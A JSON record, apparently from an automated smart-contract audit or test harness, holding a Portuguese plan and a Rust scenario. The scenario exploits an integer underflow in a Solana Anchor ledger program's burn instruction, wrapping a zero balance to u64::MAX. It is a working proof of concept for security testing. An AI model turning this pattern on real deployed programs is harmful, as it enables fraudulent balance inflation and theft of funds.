{
  "plan": "Inicializamos a conta Ledger com total_supply=100 e user_balance=0 via a instrucao initialize (baseline). Em seguida, chamamos burn com amount=1, que e maior que user_balance=0, para tentar causar underflow. O ataque usa wrapping_sub, entao esperamos que user_balance e total_supply deem a volta (underflow) em vez de falhar. Medimos o efeito lendo os valores resultantes: user_balance deve ser u64::MAX e total_supply deve ser 99 (100 - 1).",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger vazia para init
let ledger_account = empty_account();
let authority_account = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

// Baseline: inicializa o ledger com total_supply=100
let init_ix = env.anchor_ix(
    "initialize",
    &(100u64,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let init_accounts = vec![
    (ledger_key, ledger_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];
let init_result = env.baseline("initialize ledger with supply 100", &init_ix, &init_accounts);
assert!(init_result.program_result == ProgramResult::Success);

// Extrai a conta ledger resultante
let ledger_after_init = init_result.resulting_accounts.iter()
    .find(|(k, _)| *k == ledger_key)
    .map(|(_, a)| a.clone())
    .expect("ledger account not found after init");

// Ataque: burn(1) com user_balance=0 -> underflow
let burn_ix = env.anchor_ix(
    "burn",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let burn_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("burn 1 with zero balance", &burn_ix, &burn_accounts);

if attack_result.program_result == ProgramResult::Success {
    let ledger_data = after(&attack_result, &ledger_key).data();
    // Layout: 8 discriminator + 32 authority + 8 total_supply + 8 user_balance
    let total_supply = read_u64(ledger_data, 40);
    let user_balance = read_u64(ledger_data, 48);
    env.effect(
        "underflow: user_balance wrapped to u64::MAX and total_supply decreased by 1",
        user_balance == u64::MAX && total_supply == 99,
    );
}"
}

